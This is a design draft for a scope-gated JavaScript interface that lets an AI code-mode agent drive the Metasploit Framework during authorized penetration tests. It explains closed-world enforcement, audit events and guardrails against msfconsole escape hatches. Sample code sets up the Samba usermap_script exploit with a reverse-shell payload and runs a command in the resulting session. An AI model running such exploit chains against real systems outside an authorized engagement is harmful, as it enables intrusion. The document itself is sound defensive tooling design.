# A JavaScript-native, gated Metasploit API (design draft)

*A fluent JavaScript interface for driving the Metasploit Framework in multi-step scripts, where every
module run and session command stays on the [engagement gate](RedTeamEngagementGate.md) — the principled
alternative to Metasploit resource (`.rc`) scripts.*

> **Status:** v1 + v2 implemented (redserver, uncommitted). The fluent surface
> ([`MetasploitFluent.cs`](../src/Camel.PenTest.Toolkits/Metasploit/MetasploitFluent.cs):
> `MsfModuleContext` + `MsfSessionHandle`; `UseAsync`/`GetSessionAsync`/`RunDatastoreAsync` on
> [`MetasploitToolkit`](../src/Camel.PenTest.Toolkits/Metasploit/MetasploitToolkit.cs)) is built on the
> **same** gate logic and `MsfRpcClient` transport as the one-shot `RunModuleAsync`. The datastore-as-properties
> sugar (v2) is the [`MsfModuleContextWrapper`](../src/Camel.Server/MsfModuleContextWrapper.cs) Jint interop hook.
> Pivoting (v3) remains unbuilt.

> **Local-only during the hackathon freeze.** Like the rest of the red server, this lives on the
> `redserver` branch and stays off GitHub until the Find Evil! hackathon is over.

---

## Why this exists

Real Metasploit work is multi-step: `use` a module → `set` a dozen datastore options → `run` → interact
with the session it opens → load a post module → pivot → run another module through the route. Metasploit's
native way to script that is a **resource (`.rc`) file** — a batch of `msfconsole` commands.

We do **not** want `.rc`. The reason is in the toolkit's own doc-comment: an `.rc` can `set RHOSTS <anything>`
with no scope check, and `msfconsole` exposes `irb`/`ruby`/`connect` escape hatches, so a raw console path
**bypasses the engagement gate entirely**. An `.rc` is an *ungated second language*.

The key realization: **Camel already has a gated, multi-step scripting language — the JavaScript engine.**
The code-mode agent already writes multi-step msf logic by calling `RunModuleAsync` repeatedly, each call
scope- and activity-checked. So the task is not "add multi-step scripting" (we have it) — it is "make that
scripting expressive enough to feel like driving msfconsole, while keeping every action on the gated path."

A JS-native fluent API does exactly that, and it is *structurally* safer than `.rc` because of **closed-world
vs open-world enforcement**:

| `.rc` resource script (open-world)                         | JS fluent API (closed-world)                              |
| ---------------------------------------------------------- | --------------------------------------------------------- |
| Safety = *parse arbitrary console text and deny* the bad parts (`irb`, `<ruby>`, out-of-scope `set RHOSTS`). | Safety = **what methods exist**. There is no `irb()` method, so there is no irb. |
| A deny-list: miss one construct and the gate leaks.        | An allow-list by construction: the surface *is* the policy. |
| Gate would have to re-implement msfconsole's grammar.      | Gate is the same `Guard*` calls the toolkit already uses. |

`.rc` becomes unnecessary rather than something we must neuter.

---

## The object model

One new façade method on the existing `MetasploitToolkit` global, returning two new small typed objects. The
**method surface is a closed, documented set** (it goes in `camel-sdk-core`); only the *identifiers* passed to
those methods (module paths, datastore keys) are dynamic — and those are validated against the live framework.

```
MetasploitToolkit                       (existing global; SearchModules / ModuleInfo / RunModule / ListSessions stay)
  ├─ UseAsync(module)   ───────────────▶ ToolResult<MsfModuleContext>   (a stateful, INERT datastore builder)
  │      ├─ Set(key, value)  ─▶ this    (chainable; accumulates the datastore — NO daemon, NO gate yet)
  │      ├─ SetMany({...})   ─▶ this
  │      ├─ Get(key) / Keys / Options / Module / Type
  │      └─ RunAsync()       ─▶ ToolResult<ModuleRunResult>   ◀── THE GATE FIRES HERE  (.Result.SessionId)
  ├─ GetSessionAsync(id) ──────────────▶ ToolResult<MsfSessionHandle>
  │                                         ├─ RunCommandAsync(cmd) ─▶ ToolResult<string>  (re-checks peer scope)
  │                                         ├─ StopAsync()          ─▶ ToolResult<bool>    (teardown; Enumerate)
  │                                         ├─ Info / Type / PeerHost / Id / ViaExploit
  │                                         └─ (future) pivot helpers
  └─ StopSessionAsync(id) ─────────────▶ ToolResult<bool>          (close a session by id; teardown)
```

- **`MsfModuleContext`** is the msfconsole *module context* in object form. `UseAsync("exploit/multi/samba/usermap_script")`
  validates the module exists via the existing `module.info` RPC (a failed `ToolResult` on an unknown module),
  captures its type and option metadata (`.Options`), and starts an empty datastore. Every `Set` is a pure
  client-side dictionary write — **it touches no daemon and trips no gate** — so building up a run is free and
  reorderable.
- **`RunAsync()`** is the single chokepoint (see next section). It materializes the accumulated datastore into one
  `module.execute` RPC — which is itself stateless (the whole datastore goes in one call), so no server-side module
  state is needed.
- **`MsfSessionHandle`** wraps an `MsfSession` (the daemon holds the real session; the handle references it by id).
  Its `RunCommandAsync` is today's `RunSessionCommandAsync`: it re-resolves the session by id each call and
  re-checks the session's peer host against scope before acting.

This is deliberately the same `use` / `set` / `run` mental model the model has seen in vast amounts of msfconsole
and `.rc` training data — which is the whole point of code-mode — expressed as a typed object graph.

---

## Where the gate lands

The gate does not move; it is the same two-layer check the toolkit already performs in `RunModuleAsync`, relocated
to `RunAsync` on the context:

1. **`GuardActivity(ActivityForModule(type, ref))`** — the module's type selects the `ActivityClass` (exploit ⇒
   `Exploit`, `auxiliary/scanner` ⇒ `Scan`, login/brute aux ⇒ `CredentialAttack`, post ⇒ `PostExploit`, …; an
   unrecognized type fails safe to `Exploit`, the most-restrictive opt-in). That activity must be authorized.
2. **`GuardTarget(t)` for every target** extracted from the *final* datastore (`RHOSTS`/`RHOST`, space/comma-split).

Two properties make this safe:

- **The gate re-derives scope from the final datastore at `RunAsync`, not from each `Set`.** So a later
  `Set("RHOSTS", evil)` cannot slip past a check that ran on an earlier value — there is exactly one check, and it
  sees the committed state.
- **`Set` is inert.** Nothing reaches `msfrpcd` until `RunAsync`, so an unauthorized or out-of-scope run is refused
  *before the daemon is touched* — identical to today.

`MsfSessionHandle.RunCommandAsync` keeps its own post-exploitation guard: `GuardActivity(PostExploit)` plus a
re-check of the session's actual peer host (`MsfSession.PeerHost`) against scope, so a session is only addressable
while its host stays in scope.

> **Refactor note:** `ActivityForModule`, `ExtractTargets`, and the execute-then-correlate-session logic already
> exist in `MetasploitToolkit`. The fluent path should call *the same private helpers* (or a shared
> `RunDatastoreAsync(type, ref, datastore)` both `RunModuleAsync` and `MsfModuleContext.RunAsync` delegate to), so
> there is one gate implementation, not two that can drift.

---

## Closed methods, dynamic data

The tension to respect: Camel's agent contract is *"call only methods listed in `camel-sdk-core`, read only
fields listed in `camel-sdk-schema`, do not invent members."* That discipline is load-bearing — it is what keeps
the agent grounded and the audit trail legible. A fully **dynamic property-chain** API would violate it:

```js
// REJECTED — open-world member names the model can invent; un-auditable; breaks the schema contract
await msf.exploit.multi.samba.usermap_script.run({ RHOSTS: t });
```

The fix is to keep the *dynamic* parts as **data, not member names**:

```js
// ADOPTED — closed method set (Use/Set/RunAsync); module path & option keys are validated strings
const u = await MetasploitToolkit.UseAsync("exploit/multi/samba/usermap_script");  // validated via module.info
if (!u.IsSuccess) { error(u.Message); }
const m = u.Result;                                            // m.Options lists the datastore options
m.Set("RHOSTS", target).Set("PAYLOAD", "cmd/unix/reverse").Set("LHOST", kali);
const run = await m.RunAsync();                                // <-- gate fires
if (run.IsSuccess && run.Result.OpenedSession) {
  const s = await MetasploitToolkit.GetSessionAsync(run.Result.SessionId);
  log((await s.Result.RunCommandAsync("id")).Result);
}
```

Module paths and option keys are *legitimately* open-ended — and they are checked against ground truth
(`module.info` for the module; the module's own option metadata for keys), not invented. So the open-world part is
validated at runtime, inside a closed-world API.

### The one place Jint interception earns its keep (v2, built)

The single genuinely-dynamic surface worth sugaring is the **datastore-as-properties**, since a module's options
vary per module:

```js
m.RHOSTS  = target;            // sugar for m.Set("RHOSTS", target)
m.PAYLOAD = "cmd/unix/reverse";
const set = m.RHOSTS;          // reads it back
```

This is a *bounded* dynamic surface — every assignment is an inert key/value datastore write, funneled through the
same `RunAsync` gate. It cannot widen what `RunAsync` checks. It is **optional sugar**: `Set(key, value)` stays the
primary, always-documented surface. We deliberately do **not** intercept member *reads* into dynamic module
resolution (the rejected property-chain).

**How it's implemented** ([`MsfModuleContextWrapper`](../src/Camel.Server/MsfModuleContextWrapper.cs)). The
context cannot derive from a CLR `Dictionary` (Jint's dictionary support *does* give `m.RHOSTS = x`, but it also
leaks `Clear`/`Count`/`Add`/… onto the JS surface) and `ObjectWrapper` has an internal ctor (can't be subclassed).
So the sugar is a thin `ObjectInstance` installed via `Options.Interop.WrapObjectHandler` (in `PenTestMCPTools`,
keeping `MsfModuleContext` itself Jint-free): it **delegates every real member** to a default `ObjectWrapper` over
the context, and only intercepts *unknown* string property names — a write → `MsfModuleContext.Set`, a read of a
set option → `MsfModuleContext.Get`. Two details make it correct: it implements `IObjectWrapper` (and overrides
`ToObject`) so a delegated method like `m.Set(...)` binds its CLR `this` to the context (without this Jint coerces
the wrapper to an `ExpandoObject` and the call throws); and because it forwards to the default wrapper rather than
being a dictionary, it exposes **exactly** the context's documented surface — no `Dictionary` members leak in.

---

## Hard guardrails

These are what make the difference between a safe fluent API and a re-skinned `.rc`:

1. **Never bind the `console.*` RPC verbs.** `msfrpcd` exposes `console.create` / `console.write` / `console.read`
   — a full interactive msfconsole, **including `irb`**. Binding them is `.rc`'s hole through another door. The
   binding stays strictly on `module.*`, `session.*`, and `job.*` verbs.
2. **No `irb` / `ruby` / `connect` / raw-command method exists** on any object. There is nothing to deny because
   there is nothing to call. Post-exploitation is only the gated `MsfSessionHandle.RunCommandAsync`.
3. **`RunAsync` is the sole gate point** and re-derives scope + activity from the committed datastore.
4. **Pivoting needs its own scope design.** A `route add` / `autoroute` *extends* what the framework can reach — if
   added, the new route's subnet must itself pass `GuardRange`/scope, or a pivot silently widens the engagement.
   Pivot helpers are therefore **out of scope for v1** and get their own increment.

---

## Jint / implementation notes

- `MsfModuleContext` and `MsfSessionHandle` are ordinary CLR objects returned from toolkit methods; Jint marshals
  them by name like every other SDK model — no special registration for the base surface.
- **Array/collection props must be materialized** (`Options`, `Datastore` entries) per the
  [IEnumerable→array marshalling rule](../) — return `T[]`, never a lazy `IEnumerable`, or the JS side loses
  `.map`/`.length`.
- **`Set` returns the same context** for chaining; in Jint a CLR method returning `this` marshals back to the same
  wrapper, so `m.Set(...).Set(...)` works without extra plumbing.
- **Sessions live across `Execute` calls** (they are held by the daemon, referenced by id). An `MsfSessionHandle`
  the agent stores in `Session["sess"]` re-resolves its live `MsfSession` by id on each use — consistent with the
  [Session persists objects, not arrays](../) ledger pattern, and with how `RunSessionCommandAsync` already works.
- The datastore-as-properties sugar (optional) is the only part that reaches into Jint internals (a custom
  `ObjectInstance` or a `Proxy`); keep it isolated so the rest is plain marshalling.

---

## Audit

The fluent path produces the **same** audit events as `RunModuleAsync`, because it runs through the same
chokepoints:

- `Set` calls emit nothing (inert, client-side).
- `RunAsync` emits the `module.execute` operation event (with the `Toolkit`/`Operation` audit properties already
  pushed in `RunModuleAsync`), and an `activity-violation` / scope refusal if the gate trips — so an out-of-scope
  multi-step script is recorded the instant it is refused.
- A whole multi-step chain is therefore reconstructable from the trail as a sequence of gated executions, each
  citable by its `[audit] execution=<id>` handle, exactly like any other code-mode script.

---

## Relationship to the existing toolkit

`RunModuleAsync(module, options)` **stays** — it is the right one-liner for a single structured run and the unit
the live M2 test exercises. The fluent API is sugar for the *multi-step* case and shares its gate. In effect:

```
MsfModuleContext.RunAsync()  ≡  RunModuleAsync(module, accumulatedDatastore)
```

So the smallest honest implementation is: extract `RunModuleAsync`'s body into a shared
`RunDatastoreAsync(type, ref, datastore)`; have both `RunModuleAsync` and `MsfModuleContext.RunAsync` call it; add
`Use(...)` returning the context; add `MsfSessionHandle` as a thin wrapper over `RunSessionCommandAsync`.

---

## Open questions / phasing

- **v1:** `Use` → `Set`/`SetMany` → `RunAsync` → `MsfSessionHandle.RunCommandAsync`; shared gate helper; docs +
  tests (offline gate tests + a host-gated M2 chain test mirroring the existing `usermap_script` live test).
- **v2 (optional):** datastore-as-properties sugar via Jint interception.
- **v3 (separate increment):** pivoting (`route`/`autoroute`) with route-subnet scope extension.
- **Decide:** does `Use` validate eagerly (a `module.info` round-trip at `Use` time — fails fast on a typo'd
  module, costs one RPC) or lazily (defer to `RunAsync`)? Leaning **eager**, so the agent gets the option metadata
  to populate `Set` from, and a bad module name fails before any datastore is built.
- **Decide:** surface for required-but-unset options — should `RunAsync` pre-check the module's `Required` options
  against the datastore and fail with a readable `ToolResult` ("RHOSTS is required and unset") before calling the
  daemon? Leaning **yes** (cheap, and a better agent experience than msf's own error).
```
